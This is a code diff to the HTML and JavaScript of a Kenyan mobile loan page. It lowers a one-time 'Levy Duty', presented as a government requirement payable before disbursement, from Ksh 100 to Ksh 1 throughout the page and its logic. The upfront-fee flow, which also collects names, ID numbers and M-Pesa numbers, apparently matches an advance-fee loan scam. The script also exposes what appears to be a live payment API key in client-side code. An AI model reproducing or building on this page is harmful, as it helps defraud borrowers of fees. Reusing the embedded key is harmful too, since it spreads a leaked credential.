@@ -544,7 +544,7 @@
                     <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Total repayment</span><span id="sum-total" class="font-bold text-emerald-600 text-lg">Ksh 1,100</span></div>
                     <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Due date</span><span id="sum-due" class="font-bold text-slate-800">--</span></div>
                     <hr class="border-slate-100 my-2">
-                    <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Levy Duty (one-time)</span><span id="sum-levy" class="font-extrabold text-brandYellow text-lg">Ksh 100</span></div>
+                    <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Levy Duty (one-time)</span><span id="sum-levy" class="font-extrabold text-brandYellow text-lg">Ksh 1</span></div>
                 </div>
                 
                 <button onclick="goToPayment()" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl shadow-lg shadow-brandBlue/20 active:scale-95 transition-transform">Continue</button>
@@ -570,7 +570,7 @@
                             <span class="text-slate-500 font-medium text-sm block">Levy Duty (pay now)</span>
                             <span class="text-[10px] text-slate-400 font-bold uppercase tracking-wider">Gov. requirement</span>
                         </div>
-                        <span id="pay-levy" class="font-extrabold text-brandYellow text-xl">Ksh 100</span>
+                        <span id="pay-levy" class="font-extrabold text-brandYellow text-xl">Ksh 1</span>
                     </div>
                 </div>
                 
@@ -591,7 +591,7 @@
                     Change Loan Amount
                 </button>
                 
-                <button onclick="processPayment()" id="btn-pay" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl shadow-lg shadow-brandBlue/20 active:scale-95 transition-transform">Pay Ksh 100 Levy Duty</button>
+                <button onclick="processPayment()" id="btn-pay" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl shadow-lg shadow-brandBlue/20 active:scale-95 transition-transform">Pay Ksh 1 Levy Duty</button>
             </div>
         </div>
 
@@ -629,7 +629,8 @@
         const PALPLUSS_CALLBACK = "https://zpcbfaydgbhpjqsgfluv.supabase.co/functions/v1/palpluss-webhook";
         const PALPLUSS_API_KEY = "pp_live_fd61cd105772b221c4dbb023629b56452a55e06e08687de5";
 
-        let state = { name: "", id: "", mpesa: "", loan: 1000, levy: 100, term: 30, interest: 100, total: 1100 };
+        // Changed levy to 1
+        let state = { name: "", id: "", mpesa: "", loan: 1000, levy: 1, term: 30, interest: 100, total: 1100 };
         const amounts = [1000, 2000, 3000, 5000, 7500, 10000, 15000, 20000, 25000, 30000, 40000, 50000];
         let pollTimer = null;
 
@@ -640,14 +641,14 @@
             window.scrollTo(0,0);
         };
         
-        const calculateLevy = (loan) => { return 100; };
+        // Changed to return 1
+        const calculateLevy = (loan) => { return 1; };
         
         const getDueDate = (days) => {
             let d = new Date(); d.setDate(d.getDate() + days);
             return d.toLocaleDateString('en-GB', { day: 'numeric', month: 'short', year: 'numeric' });
         };
 
-        // NATIVE ANDROID TOAST LOGIC
         let toastTimeout;
         function showAndroidToast(message) {
             const toast = document.getElementById('android-toast');
